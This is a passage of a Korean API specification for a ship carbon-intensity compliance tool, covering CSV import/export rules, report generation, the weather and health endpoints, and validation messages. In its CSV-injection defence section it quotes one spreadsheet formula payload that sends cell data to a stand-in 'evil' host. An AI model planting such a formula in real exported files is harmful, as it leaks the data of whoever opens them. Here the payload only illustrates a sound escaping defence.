| 참/거짓 | `true` · `false` | JSON·CSV 양쪽에서 같게 읽힌다 |
| JSON 열 (`model_version`·`warnings`) | 한 셀에 압축 JSON | 원문 그대로 — 재현성 추적의 재료다 |

#### 응답 (200 OK · `format=json`)

**첨부가 아니다.** 이 저장소의 표준 봉투를 그대로 쓴다 — JSON은 브라우저가 저장할 대상이 아니라 화면·스크립트가 읽는 형태다. (`§8.3`의 「이 절은 파일을 내보낸다」는 PDF·CSV **문서** 이야기다.)

```json
{
  "data": {
    "type": "voyages",
    "year": 2026,
    "columns": ["voyage_id", "voyage_no", "…"],
    "rows": [{ "voyage_id": "9e1c…", "voyage_no": "V-2026-001", "…": "…" }]
  },
  "meta": { "row_count": 12, "request_id": "…", "timestamp": "…" }
}
```

`meta.row_count`를 함께 싣는다 — 받은 쪽이 파일이 잘렸는지 판단할 근거가 있어야 한다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않거나 삭제된 선박. **빈 표를 돌려주지 않는다** — 오타 난 UUID와 항차가 없는 선박이 같아 보인다 |
| 422 | `VALIDATION_ERROR` | 지원하지 않는 `type` 또는 `format` |

> **행 수 상한을 두지 않는다.** 조회가 **선박 하나 + (선택) 규제연도 하나**로 이미 한정돼 있고, 자르면 사용자는 파일 끝이 잘린 것을 모른 채 연간 자료로 쓴다. (가져오기(`§8.2`)가 1,000행 상한을 두면서도 잘라 낸 행 수를 굳이 응답에 남기는 것과 같은 이유다.)

### 8.2 CSV 가져오기

```http
POST /api/v1/vessels/{vessel_id}/import
```

#### 요청 (multipart/form-data)

| 필드 | 타입 | 설명 |
|---|---|---|
| `file` | file | CSV 파일 |
| `type` | string | `voyages` · `not_underway_periods` [#765] |

**쿼리 파라미터**

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `dry_run` | bool | N | 기본 `false`. `true`면 **검증만 하고 저장하지 않는다** — 응답의 `imported_count`는 「들어갈 수 있는 행 수」다 (#60) |

#### `type=not_underway_periods` 컬럼 [#765]

정박·묘박 구간을 **한 번에** 넣는다. `§2.9` 각주가 *「CSV 가져오기는 항차만 다루므로 이 경로를 대신하지 않는다」*고 적어 둔 자리이며, 정박 연료는 **CII의 분자에 들어간다**(`MEPC.412(84) §4.2`).

| 컬럼 | 필수 | 설명 |
|---|---|---|
| `period_type` | Y | `IN_PORT` · `AT_ANCHOR` · `DRIFTING` · `STS` · `CANAL_TRANSIT` · `DRYDOCK` |
| `started_at` | Y | **시간대가 붙은 ISO 8601**(예: `2026-09-12T09:00:00+09:00`) |
| `distance_nm` | Y | 구간 이동 거리. 접안·묘박은 `0`이 정상값이다 |
| `fuel_type` | Y | 활성 연료 코드 |
| `fuel_ton` | Y | 연료량 |
| `ended_at` | N | 비우면 **진행 중인 구간**이다 |
| `consumer_type` | N | `MAIN_ENGINE` · `AUX_ENGINE` · `OIL_FIRED_BOILER` · `OTHER`. 비우면 `AUX_ENGINE` |
| `port_name` · `lat` · `lon` | N | 표시용. 계산에 쓰지 않는다 |

**응답**은 `type=voyages`와 같은 모양이되 `overlap_checked`가 더 붙는다.

```json
{
  "data": {
    "imported_count": 12,
    "skipped_count": 2,
    "errors": [{ "row": 5, "field": "period_type", "message": "…" }],
    "overlap_checked": true,
    "dry_run": false
  },
  "meta": { … }
}
```

> **시간대가 겹치는 구간은 그 행만 거부한다.** 겹침을 받으면 **같은 연료가 두 번 세어져** 분자가 부풀고, 그 사실이 화면에 드러나지 않는다. 파일 전체를 물리지 않는 이유는 항차 CSV와 같다 — **부분 성공**이 이 절의 규약이다.
>
> ⚠️ **`dry_run`은 겹침을 보지 않는다.** 저장하지 않으므로 파일 안의 두 행이 서로 겹치는지 알 수 없다. 응답의 `overlap_checked: false`가 그 사실을 말한다 — 검증을 통과했다고 해서 저장까지 통과한다는 뜻이 아니다.
>
> **같은 구간을 다시 올리면 거부**다(겹침으로 걸린다). 갱신이 아니다 — 확정된 실적을 파일 한 번으로 조용히 바꾸면 무엇이 바뀌었는지 아무도 모른다. 고칠 때는 화면에서 그 구간을 연다(`§2.11`).

#### 부분 성공의 범위 [#1190]

**두 종류(`voyages` · `not_underway_periods`)가 같은 규약을 쓴다.** 종전에는 정박 구간만 행 단위로 떨어뜨리고 항차는 저장 단계 실패가 **500**이 됐다 — 같은 엔드포인트의 두 갈래가 다르게 동작했다.

| 규약 | 내용 |
|---|---|
| **성공한 행은 남는다** | 행 단위 부분 성공이다. 실패한 행만 `errors[]`로 떨어지고 **앞 행을 되돌리지 않는다** |
| **저장 단계 실패도 행 오류다** | 검증에서 걸린 것이든 DB가 거부한 것이든 `{row, field, message}` 한 건이다. `500`이 나가지 않는다 |
| **행 번호는 원본 파일의 번호다** | 앞에서 파싱에 실패한 행이 있어도 뒤 행의 번호가 밀리지 않는다 (#1087) |
| **`dry_run`은 실제 가져오기와 같은 판정을 낸다** | 파서가 **열마다 그 컬럼의 저장 범위와 길이를 본다**(아래). 값 때문에 저장 단계에서 죽는 행이 `dry_run`을 통과하지 않는다 |

> **왜 전체 롤백이 아닌가.** 실무 자료는 더럽다 — 1,000행에서 한 행 때문에 999행을 다시 올리게 하는 것은 이 제품이 줄이려는 수고를 늘린다. 파라미터 import(`§7.5`)의 「실패 시 롤백」과 계약이 다른 이유는 이 절 머리에 적혀 있다(규정 파라미터는 일부만 들어가면 계산 근거가 반쪽이 된다).
>
> ⚠️ **종전의 중간 상태가 가장 나빴다.** 앞 행은 커밋된 채 `500`이 나가 사용자는 「아무것도 안 들어갔다」로 읽고, 파일을 고쳐 다시 올리면 `voyage_no`에 유니크 인덱스가 없어 **같은 항차가 두 벌** 생겼다. 그리고 `dry_run`이 같은 파일에 `imported_count 3 · errors []`로 답해 **먼저 검증한 사용자일수록 안심한 뒤 당했다.**

**숫자·문자 열의 한도는 그 열이 들어가는 컬럼에서 온다.** 경로마다 한도가 갈리면 수기 API가 막는 값이 CSV로는 들어간다.

| 열 | 한도의 출처 |
|---|---|
| `planned_distance_nm` | `NUMERIC(12,2)` — `schemas/bounds.py` `DISTANCE` |
| `planned_speed_kn` | `NUMERIC(6,2)` — `SPEED`(하한 `1.0`은 도메인 · VAL-009) |
| `planned_fuel_ton` | `NUMERIC(12,4)` — `VOYAGE_FUEL` |
| `voyage_no` · 항만명 | `String(100)` · `String(200)` — **escape(`'` 접두) 뒤의 길이**를 센다 |
| 정박 `port_name` | `String(200)` |
| 정박 `lat` · `lon` | `±90` · `±180` — 수기 API(`§2.11`)와 같은 값 |

> **길이는 escape한 뒤에 본다.** 수식 주입 방어가 `'` 한 글자를 앞에 붙이므로, 컬럼 길이에 딱 맞는 값이 그 한 글자 때문에 넘친다. 실제로 저장되는 문자열을 재야 한다 — CUBRID는 넘는 값을 **잘라 넣지 않고 거부**한다.
>
> **`missing_departure_count`는 실제로 들어간 행 가운데의 수다.** 저장 단계에서 떨어진 행을 세면 「들어갔지만 출항 시각이 없다」는 뜻이 무너진다.

#### 보안 제한

> **[ORACLE-MISS-2 추가]**

| 항목 | 제한 |
|---|---|
| 최대 파일 크기 | 5MB |
| 최대 행 수 | 1,000행 |
| 인코딩 | UTF-8 (BOM optional) |
| Content-Type 검증 | `text/csv`, `application/vnd.ms-excel` 허용. 그 외 거부 |
| 수식 주입 방지 | 셀 값이 `=`, `@`, `+`, `-`로 시작하는 경우 앞에 `'` (apostrophe)를 prefix하여 escape (formula injection 방지). 숫자 컬럼은 numeric parser로 검증하여 문자열 수식 거부 |
| 필수 컬럼 | `voyage_no`, `departure_port_name`, `arrival_port_name`, `planned_distance_nm`, `planned_speed_kn`, `fuel_type`, `planned_fuel_ton` |
| 선택 컬럼 | `planned_departure_at`, `planned_arrival_at` — ISO 8601, **시간대 필수**(`2026-09-12T09:00:00+09:00` 또는 `…Z`). 빈 칸은 비어 들어간다. 시간대가 없거나 읽을 수 없으면 그 행 오류 · 저장은 UTC (#906) |

#### 응답 (200 OK)

```json
{
  "data": {
    "imported_count": 12,
    "skipped_count": 1,
    "errors": [
      { "row": 5, "field": "distance_nm", "message": "0보다 커야 합니다." }
    ],
    "missing_departure_count": 3,
    "dry_run": false
  },
  "meta": { ... }
}
```

> **[#906] 출항·도착 예정 시각은 선택 컬럼이다.** 종전에는 두 시각을 받는 컬럼이 없어 가져온 항차는 늘 시각이 비었고, 시각이 없는 항차는 진행 중으로 옮겨도 시뮬레이션 시계가 누적을 **0으로** 만든다(`#873`). 필수로 두지 않는 것은 API(`§3.3`)와 화면이 선택으로 두었기 때문이다 — 필수로 두면 기존 양식이 전부 거부되고 경로마다 규칙이 갈린다. **시간대는 필수다** — 시간대 없는 값을 UTC로 읽으면 한국 시각으로 적은 항차가 9시간 어긋난다. 대신 응답의 **`missing_departure_count`**가 들어가는(또는 `dry_run`이면 들어갈) 행 가운데 출항 예정 시각이 빈 수를 알리고, 화면이 그 수를 보인다.
>
> **행 번호는 파일에서 보이는 번호다** — 헤더가 1행이므로 첫 데이터 행이 `2`다.
>
> **틀린 행이 파일 전체를 되돌리지 않는다.** 유효한 행은 들어가고 나머지는 `errors[]`에 사유와 함께 남는다 — 응답이 `imported_count`·`skipped_count`를 따로 두는 이유다. (규정 파라미터 import(`§7.5`)는 반대다. 일부만 들어가면 계산 근거가 반쪽이 되므로 전부 아니면 전무여야 한다.)
>
> **행 수 상한을 넘기면 파일을 거부하지 않고 자른다** — 1,000행까지 처리하고 초과분은 `errors[]`에 「N행을 처리하지 않았습니다」로 남긴다. 조용히 자르면 사용자가 마지막 행들이 없어진 것을 모른다.
>
> 가져온 항차의 초기 상태는 수기 생성(`§3.3`)과 같다 — `status=DRAFT` · `annual_inclusion_policy=EXCLUDE`. **CSV로 들어왔다는 이유로 연간 집계에 바로 들어가지 않는다.** `created_from`만 `IMPORT`로 남는다(`DB_SCHEMA §2.2`).

---

### 8.3 항차 완료 리포트 (#361)

```http
GET /api/v1/voyages/{voyage_id}/report?format=pdf
```

`PRD §25.2`의 항차 완료 리포트를 생성한다.

> **응답이 JSON이 아니다.** 이 절의 두 엔드포인트는 **파일**을 내보낸다. 문서를 base64로 감싸 JSON에 넣으면 브라우저가 바로 저장하지 못하고, 33% 커진 문자열을 메모리에 통째로 들고 있어야 한다.

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `format` | string | 아니오 | `pdf`(기본) · `csv` · `html` |
| `as_of` | string | 아니오 | 기준 시각 (ISO 8601 UTC) |

> **`html`을 두는 이유.** 화면(`#362`)이 다운로드 전에 **같은 문서**를 미리 보여 줘야 한다. PDF를 iframe에 넣으면 브라우저 내장 뷰어마다 다르게 뜨고, 미리보기와 실제 문서가 갈린다.

#### 응답

| format | Content-Type | 방식 |
|---|---|---|
| `pdf` | `application/pdf` | 한 번에 생성 |
| `csv` | `text/csv; charset=utf-8` | **스트리밍** |
| `html` | `text/html; charset=utf-8` | 한 번에 생성 (첨부 아님 — 화면에 그린다) |

> **CSV만 스트리밍이다.** CSV는 줄 단위로 만들 수 있지만, PDF는 페이지 나눔 때문에 문서 전체를 봐야 첫 페이지가 확정된다 — 흉내만 내면 「스트리밍인데 첫 바이트가 끝에 나온다」가 된다.

`Content-Disposition`은 ASCII `filename`과 UTF-8 `filename*`을 **둘 다** 보낸다 (RFC 6266 §4.3). 한글 이름만 보내면 구형 클라이언트가 깨진 이름으로 저장하고, ASCII만 보내면 받은 파일이 `voyage-report-{uuid}.pdf`라 무엇인지 알 수 없다.

#### 문서 구성 (`PRD §25.2`)

| 섹션 | 내용 |
|---|---|
| 항차 요약 | 출발·도착, 거리(계획/실적), 속도(계획/실적), 출입항 시각 |
| CII 기여도 | 항차 CO₂와 **연간 누적(YTD)에서 차지한 비중**. `COR-1` 각주 필수 |
| 연료 내역 | 유종별 계획·실적·CF snapshot·배출량 |
| 시나리오 사후 비교 | **이력이 있을 때만.** 저장된 값을 그대로 인용 |

> **시나리오는 재계산하지 않는다** (`PRD §25.2.1`). 리포트 생성 시점에 다시 계산하면 파라미터 개정·기상 갱신으로 **과거 비교 근거가 바뀐다.** 이력이 없는 항차는 그 섹션을 **생략**한다 — 없는 비교를 만들지 않는다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않거나 삭제된 항차 |
| 422 | `STATE_TRANSITION_ERROR` | **진행 중 항차** — 리포트 대상이 아니다 (`PRD §25.2`) |
| 422 | `VALIDATION_ERROR` | 지원하지 않는 `format` |
| 500 | `INTERNAL_ERROR` | PDF 렌더러 사용 불가 — 메시지가 CSV를 안내한다 |

> **진행 중 항차가 422인 이유.** 실적이 확정되지 않은 값으로 문서를 만들면 **같은 항차의 리포트가 시점마다 달라진다.** 요청 형식이 틀린 것이 아니라 상태가 맞지 않는 것이므로 `STATE_TRANSITION_ERROR`다.

> **PDF 실패가 500인 이유.** 렌더러 부재는 **배포 환경의 문제**이지 사용자 입력의 문제가 아니다. 요청을 고쳐도 해결되지 않으므로 4xx가 아니며, 메시지가 CSV 형식을 안내해 사용자를 막다른 길에 두지 않는다.

---

### 8.4 연간 실적 리포트 (#361)

```http
GET /api/v1/vessels/{vessel_id}/annual-report?year=2026&format=pdf
```

`PRD §25.3`의 연간 실적 리포트를 생성한다. **연중 언제든 생성 가능**하며, 생성 시점 기준 YTD와 확정 연도 이력을 함께 싣는다.

#### 쿼리 파라미터

| 파라미터 | 타입 | 필수 | 설명 |
|---|---|---|---|
| `year` | integer | 아니오 | 규제연도. 기본 `as_of` 연도. 2019~2100 |
| `format` | string | 아니오 | `pdf`(기본) · `csv` · `html` |
| `as_of` | string | 아니오 | 기준 시각 (ISO 8601 UTC) |

#### 문서 구성 (`PRD §25.3`)

| 섹션 | 내용 | 출처 |
|---|---|---|
| YTD | 실적/기준 CII · 등급 · 누적 거리·연료·CO₂ | `§2.14` |
| 연도별 추이 | 최근 3년의 attained/required·등급·항차 수·거리·연료 | `§2.7` |
| not under way 기여 | **유형별** 건수·이동 거리(분모)·연료(분자) | `§2.9` |
| 연말 예상 | 예상 CII·등급 + **산출 가정** | `§2.14` |

> **값을 다시 계산하지 않는다.** 모든 수치는 `§2.14`·`§2.7`이 이미 만든 것을 옮긴다. 리포트가 재계산하면 화면과 문서가 갈리고, 「보고서에는 B인데 화면에는 C」가 되는 순간 **두 값 모두 못 믿게 된다.**

> **연말 예상은 가정과 함께 싣는다** (`PRD §3.3` ⑶). 값만 실으면 확정값처럼 읽힌다. 낼 수 없으면 **사유**를 적는다 — 사유 없는 빈칸은 「아직 로딩 중」으로 읽힌다.

#### 오류 응답

| 상태 | 코드 | 조건 |
|---|---|---|
| 404 | `NOT_FOUND` | 존재하지 않거나 삭제된 선박 |
| 422 | `VALIDATION_ERROR` | `year` 범위 밖 · 지원하지 않는 `format` |
| 500 | `INTERNAL_ERROR` | PDF 렌더러 사용 불가 |

---

### 8.5 리포트 공통 규약 (#361)

#### CSV injection 방어

스프레드시트는 `=`·`+`·`-`·`@`로 시작하는 셀을 **수식으로 해석**한다. `=HYPERLINK("http://evil/"&A1,"click")` 같은 값이 셀에 들어가면 파일을 연 사람의 데이터가 빠져나가고, **우리가 만든 문서가 공격 매개**가 된다.

**라벨과 문자열 열**(제목·머리글·각주·항목 이름, 그리고 선박명·시나리오 이름·유종·등급처럼 사용자 입력이나 글자가 들어가는 열)의 시작 문자를 검사해 위험하면 `'`를 붙인다. `\t`·`\r`도 함께 막는다 — OWASP 권고가 넷에 이 둘을 더하며, 탭으로 시작하는 셀이 Excel의 수식 판정을 우회한 사례가 있다.

**수치 열은 숫자로 직렬화한다** [#1247]. 표(`TableSection`)를 만드는 서비스가 열마다 종류(`string` · `numeric`)를 **선언**하고, `numeric`으로 선언된 열의 값(거리·속력·소요·연료·CF·배출량·CII·건수)은 `'` 접두 없이 나간다 — 서버가 `Decimal`에서 만든 수치는 주입 벡터가 아니고, 접두를 붙이면 음수 열이 통째로 문자열이 된다. 선언하지 않은 열은 문자열이다. 항목·값 쌍(`KeyValueSection`)은 값이 어느 열에도 속하지 않으므로 종전대로 전부 문자열 규칙이다.

> **음수 예외는 열 선언으로만 둔다.** 종전 규정은 「음수도 예외가 아니다 — 판정을 「값이 수식인가」로 하면 판정기 자체가 취약점」이었고, 그 절반은 지금도 그대로다: **값의 모양을 보고 접두를 빼는 판정기는 두지 않는다.** `-12.5`가 접두 없이 나가는 것은 그 열이 수치로 **선언**됐기 때문이지 값이 숫자처럼 보여서가 아니며, 같은 `-12.5`가 선박명 열에 있으면 종전대로 `'-12.5`다. 종전 규정이 「모든 셀」이었던 것은 지금 리포트의 수치 열(거리·연료·건수·CII)이 CHECK 제약상 음수가 없어 드러나지 않았을 뿐이고, 증감 열이 생기는 순간 열 전체가 문자열이 됐을 것이다.
>
> 선언된 수치 열에 숫자 문법(부호 하나 · 정수부(천단위 구분자 허용) · 소수부)에 맞지 않는 값이 오면 **문자열 규칙으로 되돌아간다**(fail-closed). `ValueError`로 세우지 않는 이유는 수치 열에 「값 없음」 `—`·「기록 없음」 같은 정상 문자열이 실제로 실리기 때문이며, 되돌아가면 주입도 못 하고 문서도 나간다 — 선언을 잘못 붙인 열은 종전처럼 접두를 받을 뿐이다. PDF·HTML은 이 규칙과 무관하다 — 셀 값은 여전히 문자열이고(`TECH_SPEC §19.1`), 선언은 CSV가 그 문자열을 어떻게 내보내는가만 정한다. `§8.1` 자료 내보내기도 같은 규칙·같은 함수를 쓴다.

#### UTF-8 BOM · CRLF

CSV는 **BOM으로 시작**한다. Excel(Windows)은 BOM 없는 UTF-8 CSV를 로캘 인코딩으로 읽어, 한국어 Windows에서 CP949로 해석해 한글이 전부 깨진다. 줄바꿈은 `RFC 4180` §2의 CRLF다.

#### 면책 문구

`PRD §6.3`의 리포트 문구가 **문서 본문에** 들어간다 — 화면 게시만으로는 부족하다(`PRD §25.1`). 문서가 화면 밖으로 반출되기 때문이다.

- **PDF·HTML** — 표지 본문 + 모든 페이지 푸터(`@bottom-center`)
- **CSV** — **맨 앞**. CSV는 스크롤해야 끝이 보이므로 푸터에 두면 읽히지 않는다

#### PDF 렌더링

WeasyPrint(HTML/CSS → PDF)를 쓰며, 컨테이너에 `libpango`와 한국어 폰트 `fonts-nanum`(**SIL OFL 1.1** — 임베딩·재배포 허용)을 설치한다.

> **폰트가 없으면 오류가 나지 않는다.** 렌더링은 성공하고 글자만 tofu(□□□)가 된다 — 바이트 길이도, HTTP 상태도, 예외도 정상이라 배포 사고가 조용히 지나간다. `reports.pdf.has_korean_font()`가 그 상태를 감지하며, CI가 폰트를 설치하고 **추출 텍스트**로 회귀를 잡는다.

> **폰트가 없으면 PDF를 내주지 않는다** (`#689`). `500 INTERNAL_ERROR`로 거부하고 메시지가 CSV를 안내한다 — 렌더러(WeasyPrint/Pango)가 없을 때와 **같은 처리**다. 둘 다 사용자 입력의 문제가 아니라 배포 환경의 문제이므로 4xx가 아니다.
>
> 종전에는 그 상태에서도 `200`과 유효한 `%PDF-1.7`이 나갔고, 문서 안에서 **한글만** □가 됐다. 그중에 `PRD §18.2`의 면책 문구가 있다 — **읽을 수 없는 면책이 실린 문서는 리포트가 아니다.** 같은 요청의 CSV·HTML은 영향받지 않으므로, 사용자는 형식을 바꿔 같은 내용을 받는다.
>
> 판정은 **프로세스당 1회**다(`reports.pdf.korean_font_available()`). 폰트를 설치한 뒤에는 **서버를 다시 시작해야** 반영된다. 배포 환경의 폰트 상태는 `§10`의 `pdf_korean_font`로 확인한다.

---

## 9. Weather API (내부)

> 이 엔드포인트는 내부 디버깅용이며, 일반 사용자에게는 노출되지 않는다.

> ## ✅ 조회는 열었고, 수동 갱신은 열지 않는다 (`#767` 판정 · 2026-09-12)
>
> `#591`(2026-08-23)이 둘 다 유예하며 든 이유는 *「내부 디버깅용이므로 누가 부를 수 있는지를 먼저 정해야 하고, 그것은 어드민 범위(`#359`)에 걸린다」*였다. **그 전제가 바뀌었다** — `#808`(2026-09-12)이 「사내 도구 · 로그인 사용자는 같은 선박·항차 데이터를 공유」로 확정해 **역할 구분이 없다.** 경계는 「로그인했는가」 하나이고 `auth_middleware`가 모든 비공개 경로에 이미 걸고 있다.
>
> | 절 | 판정 | 근거 |
> |---|---|---|
> | `§9.1` 조회 | **연다** | 부작용이 없다. 「이 계산의 보정 계수가 왜 그 값인가」를 설명하는 유일한 창이다 |
> | `§9.2` 수동 갱신 | **열지 않는다** | **사용자가 외부 API 호출을 직접 일으키는 유일한 경로**가 된다. 기상은 계산 요청이 필요할 때 알아서 갱신하므로(`TECH_SPEC §7.3` fallback 체인) **없어도 제품이 성립**하고, 열면 그때부터 Open-Meteo 쿼터 관리가 따라온다 |
>
> **`§9.2`의 명세는 지운다.** 「미구현」으로 남기던 종전 방식(`#591` C안)은 **언젠가 만든다**는 뜻인데, 이번 판정은 **열지 않기로 정한 것**이라 성격이 다르다. 명세를 남기면 다음 사람이 「아직 안 만든 것」으로 읽고 만들게 된다. 되살릴 조건은 아래 각주에 적는다.
>
> **되살릴 조건** — 기상 조회가 사용자 눈에 보이는 지연을 만들 때(계산 요청이 매번 외부를 기다리는 상태), 또는 운영자가 특정 좌표를 강제로 다시 받아야 하는 사건이 실제로 생겼을 때다. 그때는 **요청 한도와 함께** 설계한다(`§13.2`).
>
> 이 판정이 낡지 않게 **`§12` 요약표와 실제 라우트를 대조하는 가드**(`tests/test_api_spec_endpoints_sync.py`)가 CI에서 돈다 — 표와 코드가 어긋나면 거기서 멈춘다.


### 9.1 기상 스냅샷 조회

```http
GET /api/v1/weather/snapshot?lat=35.0&lon=129.0
```

#### 응답 (200 OK)

```json
{
  "data": {
    "lat": 35.0,
    "lon": 129.0,
    "fetched_at": "2026-07-03T11:30:00Z",
    "wave_height_m": 1.5,
    "wave_direction_deg": 45.0,
    "wave_period_s": 6.0,
    "wind_speed_ms": 8.0,
    "wind_direction_deg": 90.0,
    "source": "open_meteo_marine",
    "age_hours": 0.5,
    "freshness": "FRESH"
  },
  "meta": { ... }
}
```

| freshness | 조건 |
|---|---|
| `FRESH` | age ≤ 6h |
| `STALE` | 6h < age ≤ 24h |
| `EXPIRED` | age > 24h |

### 9.2 기상 수동 갱신 — **열지 않는다** [#767]

```http
POST /api/v1/weather/refresh   ← 이 라우트는 없다
```

종전에는 「Open-Meteo API에서 최신 데이터를 강제로 가져온다」로 명세돼 있었고 `#591`이 「미구현」으로 남겼다. `#767`이 **열지 않기로** 판정했다(위 블록). 사용자가 외부 호출을 직접 일으키는 유일한 경로이고, 갱신은 계산 요청이 fallback 체인에서 이미 수행한다.

호출하면 **404**다 — 다른 미등록 경로와 같은 응답이며, 존재 여부를 따로 알리지 않는다(`§1.4`).


---

## 10. Health Check

> **[ORACLE-M-5 추가]**

```http
GET /api/v1/health
```

로드 밸런서 및 모니터링용 헬스 체크 엔드포인트. 인증 불필요.

#### 응답 (200 OK)

```json
{
  "data": {
    "status": "ok",
    "version": "1.0.0",
    "numpy_version": "2.1.0",
    "rng_canonical_test": "passed",
    "pdf_korean_font": "ok"
  }
}
```

> **`rng_canonical_test`** — PCG64DXSM(seed=12345)의 첫 5개 uniform 값이 `TECH_SPEC §2.5.1`
> canonical vector와 `1e-15` 이내로 일치하면 `"passed"`, 아니면 `"failed"`다.
> **프로세스당 1회만 계산**한다 — 이 값은 NumPy 버전과 플랫폼에서 결정되며 둘 다
> 프로세스 수명 동안 바뀌지 않는다.
>
> **`"failed"`여도 `status`는 `"ok"`를 유지한다** (#400). 두 필드는 서로 다른 것을 본다 —
> `status`는 liveness(루트 `Dockerfile`의 HEALTHCHECK 용도)이고, RNG 불일치는 프로세스가
> 살아 있고 응답도 하는 상태다. **재시작으로 해결되지 않으므로**(NumPy 버전은 이미지에
> 고정) `status`를 내리면 오케스트레이터가 무한 재시작 루프에 빠지면서 원인은 그대로
> 남는다. 재현성 계약(`TECH_SPEC §5.4`) 위반 신호는 이 필드가 전달하며, 모니터링이
> 이 값에 알람을 건다.
>
> *(2026-08-12~08-15 유예: `#43` 완료 전까지 거짓 `"passed"`를 내지 않으려 필드를 생략했다.
> `#43` 머지로 유예가 해소되어 `#400`에서 구현했다.)*

> **`pdf_korean_font`** — 리포트 PDF에 한글을 그릴 수 있는가 (`#689`). 세 값을 낸다.
>
> | 값 | 뜻 | 조치 |
> |---|---|---|
> | `"ok"` | 한국어 글리프를 그릴 수 있다 | — |
> | `"missing"` | 렌더러는 있으나 **한국어 폰트가 없다.** PDF 요청이 `§8.5`에 따라 500으로 거부된다 | `fonts-nanum` 설치 후 재시작 |
> | `"unavailable"` | **WeasyPrint 런타임(Pango) 자체가 없다.** 폰트를 설치해도 해결되지 않는다 | `libpango-1.0-0` 설치 |
>
> **두 값을 뭉치지 않는다** — 설치해야 할 것이 다르므로, 한 값으로 내면 이 필드를 보고도 무엇을 해야 하는지 알 수 없다.
>
> **`rng_canonical_test`와 같은 규약이다.** `"missing"`이어도 `status`는 `"ok"`다 — 프로세스는 살아 있고 CSV·HTML 리포트는 정상으로 나가며, **재시작으로 해결되지 않는다**(폰트 설치가 필요하다). `status`를 내리면 오케스트레이터가 컨테이너를 죽이면서 원인은 그대로 남는다.
>
> **프로세스당 1회만 계산한다.** 판정에 프로브 문서 렌더링이 들어가므로, 캐시하지 않으면 헬스 체크마다 PDF를 한 장씩 그리게 된다.
>
> *(이 필드가 없던 동안 **폰트 부재를 볼 수단이 배포 환경에 하나도 없었다** — PDF는 200으로 나가고 한글만 □가 되므로 응답을 봐서는 알 수 없었다. `#689`가 시연 서버에서 그 상태를 발견했다.)*

---

## 11. 검증 규칙 요약

> PRD §9.1의 모든 검증 규칙을 API 응답에 매핑한다.

| Rule ID | 규칙 | 오류 응답 |
|---|---|---|
| VAL-001 | 필수값 비어 있음 | 422: `{field_label}을/를 입력하세요.` |
| VAL-002 | 거리·연료·DWT·GT·선박 기준속도(`reference_speed_kn`)가 **저장 가능한 최솟값 미만** | 422: `{field_label}은/는 {하한} 이상이어야 합니다.` — 예: `총톤수(GT)는 0.01 이상이어야 합니다.` |
| VAL-003 | IMO 번호 형식 오류 | 422: 길이 `IMO 번호는 7자 이상이어야 합니다.` · 형식 `IMO 번호 형식이 올바르지 않습니다.` |
| VAL-004 | 지원하지 않는 선종 | 422: `알 수 없는 선종입니다: {값}` |
| VAL-005 | 기준연도 파라미터 없음 | 409: `해당 연도의 규정 파라미터가 없습니다.` (+ 호출부가 `(기준연도 {년})`을 덧붙인다) |
| VAL-006 | 지원하지 않는 연료 | 422: `알 수 없는 연료 종류입니다: {값}` · CSV(`§8.2`)는 `지원하지 않는 연료입니다: {값}` |
| VAL-007 | 좌표 범위 오류 | 422: `{field_label}은/는 {경계} 이하여야 합니다.` — 예: `현재 위도는 90 이하여야 합니다.` |
| VAL-008 | NaN·Infinity 결과 | 422: `계산 오류: 입력값을 확인하세요.` |
| VAL-009 | 항차·시나리오 운항 속도 < 1.0kn | 422: `{field_label}은/는 1 이상이어야 합니다.` — 예: `계획 속력은 1 이상이어야 합니다.` |
| VAL-010 | capacity ≤ 0 | 422: 어느 축이 비었는지 말한다 — 예: `재화중량톤수(DWT)가 없어 이 선박의 CII를 계산할 수 없습니다. 선박 제원에 재화중량톤수(DWT)를 입력해 주세요.` (`#999`) |
| VAL-011 | 호출부호 형식 오류 (#1197 — ITU RR No.19.55 · No.19.50) | 422: `호출부호는 영문 대문자와 숫자 4~7자여야 합니다.` · 앞 두 글자가 모두 숫자면 `호출부호의 앞 두 글자는 모두 숫자일 수 없습니다.` |

> **[#1329] 이 표는 「문구의 틀」이지 글자 그대로의 문장이 아니다.** `{field_label}`은 `§1.3.2`의 라벨이고 `{하한}`·`{경계}`는 그 필드의 실제 값이다 — **한 규칙이 여러 필드에 걸리므로** 문장을 하나로 고정하면 「무엇의 하한인가」를 말할 수 없다.
>
> **종전 표는 실제 응답과 달랐다.** 차이 난 자리는 전부 **앞선 이슈가 의도적으로 바꾼 것**(`#860` 저장 하한 · `#999` 용량 축 안내 등)이고 이 표만 뒤처져 있었다. 사유는 `PRD §9.1`의 대조표에 적었다.
>
> ⚠️ **CSV 가져오기(`§8.2`)도 같은 틀을 쓴다.** 종전에는 그 경로가 문구를 따로 들고 있어 **같은 값 오류가 CSV로는 「0보다 커야 합니다」, 화면 입력으로는 「계획 거리는 0.01 이상이어야 합니다」**로 나갔다.
>
> 실제 응답과 이 표가 갈리지 않는지는 `tests/test_validation_message_canon_sync.py`가 본다.

---

## 12. 엔드포인트 요약

| Method | Path | 기능 | PRD 참조 |
|---|---|---|---|
| GET | `/api/v1/health` | 헬스 체크 | — |
| POST | `/api/v1/auth/signup` | 회원 가입 | §1.2 |
| POST | `/api/v1/auth/login` | 로그인 | §1.2 |
| POST | `/api/v1/auth/logout` | 로그아웃 | §1.2 |
| GET | `/api/v1/auth/me` | 현재 사용자 | §1.2 |
| PATCH | `/api/v1/auth/me` | 표시 이름 변경 (`email`은 받지 않는다) | §6.3 |
| DELETE | `/api/v1/auth/me` | 탈퇴 (soft delete + 세션 전량 무효화) | §6.3 |
| GET | `/api/v1/auth/users` | 계정 목록 (**관리자**) | §1.2 |
| PATCH | `/api/v1/auth/users/{user_id}/role` | 역할 지정 (**관리자**) | §1.2 |
| POST | `/api/v1/auth/password-change` | 비밀번호 변경 (로그인 상태) | §6.3 |
| POST | `/api/v1/auth/dev-login` | 개발용 로그인 (**프로덕션 미등록**) | §1.2 |
| POST | `/api/v1/auth/tour-login` | 둘러보기 로그인 — 가입 없이 여는 관리자 **열람** 세션 (**항상 등록 · `TOUR_ACCESS_CODE`/`TOUR_PUBLIC`으로 열림 · 세션은 읽기 전용** · #1486) | §1.2 |
